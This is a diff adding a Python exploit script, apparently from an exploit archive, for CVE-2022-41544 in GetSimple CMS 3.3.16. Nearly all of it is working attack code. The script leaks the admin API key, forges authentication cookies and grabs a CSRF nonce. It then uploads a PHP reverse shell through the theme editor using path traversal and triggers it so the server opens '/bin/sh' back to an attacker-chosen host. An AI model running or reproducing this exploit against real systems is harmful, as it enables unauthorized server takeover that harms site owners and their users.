@@ -1,0 +1,147 @@
+id: 38727
+date: 05/23/2023
+title: GetSimple CMS v3.3.16 - Remote Code Execution Exploit
+author: Youssef Muhammad
+cves: CVE-2022-41544
+
+# Exploit Title: GetSimple CMS v3.3.16 - Remote Code Execution (RCE)
+# Exploit Author : Youssef Muhammad
+# Vendor: Get-simple
+# Software Link:
+# Version app: 3.3.16
+# Tested on: linux
+# CVE: CVE-2022-41544
+
+import sys
+import hashlib
+import re
+import requests
+from xml.etree import ElementTree
+from threading import Thread
+import telnetlib
+
+purple = "\033[0;35m"
+reset = "\033[0m"
+yellow = "\033[93m"
+blue = "\033[34m"
+red = "\033[0;31m"
+
+def print_the_banner():
+    print(purple + '''
+ CCC V     V EEEE      22   000   22   22      4  4  11  5555 4  4 4  4 
+C    V     V E        2  2 0  00 2  2 2  2     4  4 111  5    4  4 4  4 
+C     V   V  EEE  ---   2  0 0 0   2    2  --- 4444  11  555  4444 4444 
+C      V V   E         2   00  0  2    2          4  11     5    4    4 
+ CCC    V    EEEE     2222  000  2222 2222        4 11l1 555     4    4 
+ '''+ reset)
+
+def get_version(target, path):
+    r = requests.get(f"http://{target}{path}admin/index.php")
+    match = re.search("jquery.getsimple.js\?v=(.*)\"", r.text)
+    if match:
+        version = match.group(1)
+        if version <= "3.3.16":
+            print( red + f"[+] the version {version} is vulnrable to CVE-2022-41544")
+        else:
+            print ("This is not vulnrable to this CVE")
+        return version
+    return None
+
+def api_leak(target, path):
+    r = requests.get(f"http://{target}{path}data/other/authorization.xml")
+    if r.ok:
+        tree = ElementTree.fromstring(r.content)
+        apikey = tree[0].text
+        print(f"[+] apikey obtained {apikey}")
+        return apikey
+    return None
+
+def set_cookies(username, version, apikey):
+    cookie_name = hashlib.sha1(f"getsimple_cookie_{version.replace('.', '')}{apikey}".encode()).hexdigest()
+    cookie_value = hashlib.sha1(f"{username}{apikey}".encode()).hexdigest()
+    cookies = f"GS_ADMIN_USERNAME={username};{cookie_name}={cookie_value}"
+    headers = {
+        'Content-Type':'application/x-www-form-urlencoded',
+        'Cookie': cookies
+    }
+    return headers
+
+def get_csrf_token(target, path, headers):
+    r = requests.get(f"http://{target}{path}admin/theme-edit.php", headers=headers)
+    m = re.search('nonce" type="hidden" value="(.*)"', r.text)
+    if m:
+        print("[+] csrf token obtained")
+        return m.group(1)
+    return None
+
+def upload_shell(target, path, headers, nonce, shell_content):
+    upload_url = f"http://{target}{path}admin/theme-edit.php?updated=true"
+    payload = {
+        'content': shell_content,
+        'edited_file': '../shell.php',
+        'nonce': nonce,
+        'submitsave': 1
+    }
+    try:
+        response = requests.post(upload_url, headers=headers, data=payload)
+        if response.status_code == 200:
+            print("[+] Shell uploaded successfully!")
+        else:
+            print("(-) Shell upload failed!")
+    except requests.exceptions.RequestException as e:
+        print("(-) An error occurred while uploading the shell:", e)
+def shell_trigger(target, path):
+    url = f"http://{target}{path}/shell.php"
+    try:
+        response = requests.get(url)
+        if response.status_code == 200:
+            print("[+] Webshell trigged successfully!")
+        else:
+            print("(-) Failed to visit the page!")
+    except requests.exceptions.RequestException as e:
+        print("(-) An error occurred while visiting the page:", e)
+
+def main():
+    if len(sys.argv) != 5:
+        print("Usage: python3 CVE-2022-41544.py <target> <path> <ip:port> <username>")
+        return
+
+    target = sys.argv[1]
+    path = sys.argv[2]
+    if not path.endswith('/'):
+        path += '/'
+
+    ip, port = sys.argv[3].split(':')
+    username = sys.argv[4]
+    shell_content = f"""<?php
+    $ip = '{ip}';
+    $port = {port};
+    $sock = fsockopen($ip, $port);
+    $proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
+    """
+
+    version = get_version(target, path)
+    if not version:
+        print("(-) could not get version")
+        return
+
+    apikey = api_leak(target, path)
+    if not apikey:
+        print("(-) could not get apikey")
+        return
+
+    headers = set_cookies(username, version, apikey)
+
+    nonce = get_csrf_token(target, path, headers)
+    if not nonce:
+        print("(-) could not get nonce")
+        return
+
+    upload_shell(target, path, headers, nonce, shell_content)
+    shell_trigger(target, path)
+
+if __name__ == '__main__':
+    print_the_banner()
+    main()
+
+#  0day.today [2023-06-08]  #
